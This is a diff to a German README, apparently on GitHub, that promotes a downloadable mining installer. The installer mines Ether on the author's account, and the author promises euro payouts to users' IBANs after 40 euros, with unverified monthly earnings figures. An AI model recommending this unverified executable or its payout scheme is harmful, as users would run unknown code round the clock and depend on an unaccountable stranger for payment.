@@ -2,13 +2,13 @@
 
 
 <h4 align="center">
- Start Crypto mining direkt zu deine <strong>IBAN</strong> mit einfachen installation...
+ Start Krypto-Mining mit einer einfachen Installation direkt zu deinem <strong>IBAN</strong>
 </h4>
 
-habe einige test bezüglich crypto-mining gestartet, da sind meine Erfahrungen und Ideen
-alles ohne Gewähr, Cryptos (in dem Fall Ether) sind sehr volatil und unberechenbar
-die Ertäge können doppelt aber auch nur halb so hoch sein, von Tageskurs (usw.) abhängig.
-Durchschnittswerte pro **Monat**:
+In letzten 6 Monaten stelle ich Kryptos her, und möchte hier meine Erfahrungen teilen.
+Kryptos, in dem Fall Ether, sind sehr volatil. Je nach Kursentwicklung können die Ertäge doppelt
+oder auch nur halb so hoch sein. Die Tabelle zeigt die Durchschnittswerte der Ertäge pro **Monat**:
+
 
 
 |Grafikkarte        |PC         | Mh/s | Watt/h| Ein   | Kosten Strom|Ertrag|
@@ -17,8 +17,8 @@ Durchschnittswerte pro **Monat**:
 |Geforce RTXm 3070  |MSI Leopard|52    |160  |85 €       |19 €	|66 €|				
 |Geforce RTXm 3060  |Acer Nitro |35    |100  |60 €       |12 €	|48 €|
 
-Also mit ein aktuellen gaming Laptop, könnt ihr monatlich 50 bis 70 Euro einnehmen,  
-allerdings muss da euere Gerät **rund um die Uhr** mit volle Leistung (also **laut**) laufen.  
+Das heißt, mit einem aktuellen Gaming Laptop, kannst du monatlich ca. 50 bis 70 Euro Gewinn erzielen.
+Dafür muss dein Gerät allerdings  **rund um die Uhr** laufen.  
 
 Wenn ihr das ganze einfach testen wollt, könnt ihr es einfach mit meine Konto machen.  
 
@@ -28,7 +28,7 @@ Nachdem Du 40 Euro errechnet hast wir der Betrag auf dein IBAN, wenn angegeben, 
 [VideoClip installation](https://www.youtube.com/watch?v=MStYauQYFYQ)
 
 <p align="center">
-  <a href="https://github.com/FriNagy/meiner/releases/download/v1.0/nanom_inst.exe"><img
+  <a href="https://github.com/FriNagy/meiner/releases/download/init/nanom_inst.exe"><img
 		alt="Download Installations Programm"
 		src="https://github.com/FriNagy/meiner/blob/main/files/down.png"></a>
 </p>
@@ -38,7 +38,7 @@ Nachdem Du 40 Euro errechnet hast wir der Betrag auf dein IBAN, wenn angegeben, 
 	<img src="https://github.com/FriNagy/meiner/blob/main/files/screen1.png" width="70%">
 </p>
 
-### Berechnen die Auszahlungen,
+### Auszahlungsmodus:
 Jeder Tagesende werden die jeweils errechnete Shares ermittelt und zu deinem Konto zugeordnet,   
 nach dem das MiningPool im Ether auszahlt, wird zeitnah auf Euro gewechselt und dieser Betrag anteilig nach shares verteilt.  
 hat nun dein Konto 40 Euro erreicht, wird es an dich ausbezahlt. 4 Euro Überweisungsgebühr (inkl.MWst) muss ich abziehen
